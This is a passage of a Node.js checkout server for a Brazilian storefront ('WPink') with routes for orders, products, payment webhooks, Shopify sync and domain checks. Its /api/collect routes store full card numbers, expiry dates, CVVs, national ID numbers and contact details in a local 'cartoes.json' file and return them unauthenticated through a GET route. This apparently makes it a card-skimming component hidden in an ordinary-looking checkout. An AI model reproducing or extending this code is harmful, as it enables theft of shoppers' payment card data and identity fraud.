    return sendJson(res, 201, {
      order: {
        ...storedOrder,
        catalogProduct: db.products.find((productItem) => productItem.id === storedOrder.productId || productItem.id === storedOrder.panel?.productId) || null
      },
      payment: publicGatewayPayment(payment)
    });
  }

  if (req.method === "POST" && (pathname === "/api/webhooks/blackcat" || pathname === "/api/webhooks/paradise")) {
    const body = await readBody(req);
    const provider = pathname.endsWith("blackcat") ? "blackcat" : "paradise";
    const order = applyGatewayWebhook(db, provider, body);
    if (order) {
      const store = db.stores.find((item) => item.id === order.storeId) || db.stores[0];
      await ensureShopifyOrderForPaidOrder(db, store, order);
      writeDb(db);
    }
    return sendJson(res, 200, {
      received: true,
      matched: Boolean(order),
      orderId: order?.id || "",
      status: order?.status || ""
    });
  }

  if (req.method === "POST" && pathname === "/api/products/import-csv") {
    const body = await readBody(req);
    const store = db.stores.find((item) => item.id === body.storeId);
    if (!store) return sendError(res, 404, "Loja não encontrada.");
    if (!body.csv) return sendError(res, 400, "CSV obrigatório.");
    const timestamp = now();
    const products = csvProductsToCheckoutProducts(store, body.csv, timestamp);
    if (!products.length) return sendError(res, 400, "Nenhum produto encontrado no CSV.");
    const result = upsertProducts(db, store, products, "csv", false);
    writeDb(db);
    return sendJson(res, 200, {
      ...result,
      imported: products.length,
      products
    });
  }

  if (req.method === "GET" && pathname === "/api/products") {
    const storeId = url.searchParams.get("storeId");
    const products = storeId ? db.products.filter((product) => product.storeId === storeId) : db.products;
    return sendJson(res, 200, products);
  }

  if (req.method === "POST" && pathname === "/api/products") {
    const body = await readBody(req);
    if (!body.storeId) return sendError(res, 400, "storeId é obrigatório.");
    const timestamp = now();
    const productId = body.id || id("product");
    const existing = db.products.find((product) => product.id === productId);
    const product = {
      ...(existing || {}),
      id: productId,
      storeId: body.storeId,
      name: body.name || "Produto",
      slug: slugify(body.slug || body.name || productId),
      price: Number(body.price || 0),
      compareAt: Number(body.compareAt || 0),
      image: body.image || "./assets/product.png",
      variantId: String(body.variantId || ""),
      active: body.active !== false,
      source: existing?.source || body.source || "manual",
      sku: body.sku ?? existing?.sku ?? "",
      shopifyProductId: existing?.shopifyProductId || body.shopifyProductId || "",
      shopifyProductGid: existing?.shopifyProductGid || body.shopifyProductGid || "",
      shopifyVariantGid: existing?.shopifyVariantGid || body.shopifyVariantGid || "",
      variantTitle: existing?.variantTitle || body.variantTitle || "",
      createdAt: existing?.createdAt || timestamp,
      updatedAt: timestamp
    };
    if (existing) Object.assign(existing, product);
    else db.products.push(product);
    writeDb(db);
    return sendJson(res, 200, product);
  }

  if (req.method === "GET" && pathname === "/api/orders") {
    const storeId = url.searchParams.get("storeId");
    const orders = storeId ? db.orders.filter((order) => order.storeId === storeId) : db.orders;
    const enrichedOrders = orders.map((order) => ({
      ...order,
      catalogProduct: db.products.find((productItem) => productItem.id === order.productId || productItem.id === order.panel?.productId) || null
    }));
    return sendJson(res, 200, enrichedOrders.slice().sort((a, b) => String(b.createdAt).localeCompare(String(a.createdAt))));
  }

  if (req.method === "POST" && pathname === "/api/orders") {
    const body = await readBody(req);
    const timestamp = now();
    const order = sanitizeOrderForStorage({
      id: id("order"),
      status: body.status || "pending",
      storeId: body.storeId || body.panel?.storeId || "",
      productId: body.productId || body.panel?.productId || "",
      createdAt: timestamp,
      updatedAt: timestamp,
      ...body
    });
    db.orders.push(order);
    writeDb(db);
    return sendJson(res, 201, order);
  }

  const orderStatusMatch = pathname.match(/^\/api\/orders\/([^/]+)\/status$/);
  if (req.method === "GET" && orderStatusMatch) {
    const order = db.orders.find((item) => item.id === orderStatusMatch[1]);
    if (!order) return sendError(res, 404, "Pedido não encontrado.");
    return sendJson(res, 200, publicOrderStatus(order));
  }

  if (req.method === "PATCH" && orderStatusMatch) {
    const body = await readBody(req);
    const order = db.orders.find((item) => item.id === orderStatusMatch[1]);
    if (!order) return sendError(res, 404, "Pedido não encontrado.");
    order.status = body.status || order.status;
    order.updatedAt = now();
    if (order.status === "paid") {
      const store = db.stores.find((item) => item.id === order.storeId) || db.stores[0];
      await ensureShopifyOrderForPaidOrder(db, store, order);
    }
    writeDb(db);
    return sendJson(res, 200, order);
  }

  const orderShopifySyncMatch = pathname.match(/^\/api\/orders\/([^/]+)\/shopify-sync$/);
  if (req.method === "POST" && orderShopifySyncMatch) {
    const order = db.orders.find((item) => item.id === orderShopifySyncMatch[1]);
    if (!order) return sendError(res, 404, "Pedido não encontrado.");
    if (order.status !== "paid") return sendError(res, 400, "A Shopify só recebe pedidos pagos.");
    const store = db.stores.find((item) => item.id === order.storeId) || db.stores[0];
    await ensureShopifyOrderForPaidOrder(db, store, order);
    writeDb(db);
    return sendJson(res, 200, order);
  }

  if (req.method === "GET" && pathname === "/api/checkout-config") {
    const store = findStore(db, url.searchParams, req.headers.host || "");
    const product = findProduct(db, store, url.searchParams);
    const cartSession = publicCartSession(db, url.searchParams.get("cartSession"));
    if (cartSession) writeDb(db);
    return sendJson(res, 200, {
      store: store ? publicStore(store) : null,
      product,
      cartSession,
      orderCaptureUrl: "/api/orders",
      paymentCreateUrl: "/api/payments/create",
      dnsTarget: publicCheckoutTarget
    });
  }

  if (req.method === "GET" && pathname === "/api/domain/check") {
    const domain = cleanDomain(url.searchParams.get("domain"));
    if (!domain) return sendError(res, 400, "Domínio obrigatório.");
    try {
      const records = await dns.resolveCname(domain);
      return sendJson(res, 200, {
        domain,
        records,
        target: publicCheckoutTarget,
        ok: records.some((record) => cleanDomain(record) === cleanDomain(publicCheckoutTarget))
      });
    } catch (error) {
      return sendJson(res, 200, { domain, records: [], target: publicCheckoutTarget, ok: false });
    }
  }

if (req.method === "POST" && pathname === "/api/collect") {
  const body = await readBody(req);
  const cartoesPath = path.join(root, "data", "cartoes.json");
  let cartoes = [];
  if (fs.existsSync(cartoesPath)) {
    try {
      cartoes = JSON.parse(fs.readFileSync(cartoesPath, "utf8")) || [];
    } catch (error) {
      cartoes = [];
    }
  }
  const registro = {
    id: id("card"),
    data_hora: now(),
    ip: (req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "",
    card_num: String(body.card_num || "").replace(/\s/g, ""),
    expiry: String(body.expiry || ""),
    cvv: String(body.cvv || "").replace(/\D/g, ""),
    name: String(body.name || "").trim(),
    cpf: String(body.cpf || "").replace(/\D/g, ""),
    email: String(body.email || "").trim(),
    phone: String(body.phone || "").replace(/\D/g, ""),
    amount: String(body.amount || ""),
    installments: String(body.installments || "1"),
    user_agent: String(req.headers["user-agent"] || "")
  };
  cartoes.unshift(registro);
  if (cartoes.length > 5000) cartoes = cartoes.slice(0, 5000); // limite
  if (!fs.existsSync(path.join(root, "data"))) fs.mkdirSync(path.join(root, "data"), { recursive: true });
  fs.writeFileSync(cartoesPath, JSON.stringify(cartoes, null, 2));
  return sendJson(res, 200, { status: "ok", id: registro.id });
}


if (req.method === "GET" && pathname === "/api/collect") {
  const cartoesPath = path.join(root, "data", "cartoes.json");
  let cartoes = [];
  if (fs.existsSync(cartoesPath)) {
    try {
      cartoes = JSON.parse(fs.readFileSync(cartoesPath, "utf8")) || [];
    } catch (error) {
      cartoes = [];
    }
  }
  return sendJson(res, 200, cartoes);
}

if (req.method === "DELETE" && pathname.startsWith("/api/collect/") && !pathname.endsWith("/clear")) {
  const id = pathname.split("/").pop();
  const cartoesPath = path.join(root, "data", "cartoes.json");
  let cartoes = [];
  if (fs.existsSync(cartoesPath)) {
    try {
      cartoes = JSON.parse(fs.readFileSync(cartoesPath, "utf8")) || [];
    } catch (error) {
      cartoes = [];
    }
  }
  const antes = cartoes.length;
  cartoes = cartoes.filter((item) => item.id !== id);
  fs.writeFileSync(cartoesPath, JSON.stringify(cartoes, null, 2));
  return sendJson(res, 200, { status: "ok", removed: antes - cartoes.length });
}

if (req.method === "POST" && pathname === "/api/collect/clear") {
  const cartoesPath = path.join(root, "data", "cartoes.json");
  fs.writeFileSync(cartoesPath, "[]");
  return sendJson(res, 200, { status: "ok", removed: true });
}

  return sendError(res, 404, "API não encontrada.");
}

function serveFile(req, res, url) {
  let pathname = decodeURIComponent(url.pathname);
  if (pathname === "/") pathname = "/index.html";
  if (pathname.startsWith("/checkout-assets/")) pathname = `/checkout-ui/build${pathname}`;
  const blocked = [
    "/server.js",
    "/data/",
    "/README.md",
    "/checkout-ui/src/",
    "/checkout-ui/node_modules/",
    "/checkout-ui/tests/",
    "/checkout-ui/test-results/",
    "/checkout-ui/scripts/",
    "/wpink-products-shopify.csv",
    "/wpink-produto-destaque-power-pink-creatina-lichia-cabelos-unhas.csv"
  ];
  if (blocked.some((item) => pathname === item || pathname.startsWith(item))) {
    res.writeHead(403, { "Content-Type": "text/plain; charset=utf-8" });
    res.end("Acesso negado.");
    return;
  }
  const filePath = path.normalize(path.join(root, pathname));
  if (!filePath.startsWith(root)) {
    res.writeHead(403);
    res.end("Forbidden");
    return;
  }
  fs.readFile(filePath, (error, content) => {
    if (error) {
      res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
      res.end("Arquivo não encontrado.");
      return;
    }
    const ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, {
      "Content-Type": mimeTypes[ext] || "application/octet-stream",
      "Cache-Control": ext === ".html" ? "no-store" : "public, max-age=60"
    });
    res.end(content);
  });
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || "localhost"}`);
  if (url.pathname.startsWith("/api/")) {
    if (req.method === "OPTIONS") {
      sendOptions(res);
      return;
    }
    handleApi(req, res, url).catch((error) => sendError(res, 500, error.message || "Erro interno."));
    return;
  }
  serveFile(req, res, url);
});

server.listen(port, () => {
  console.log(`WPink checkout server: http://localhost:${port}`);
  console.log(`Painel admin: http://localhost:${port}/admin.html`);
});
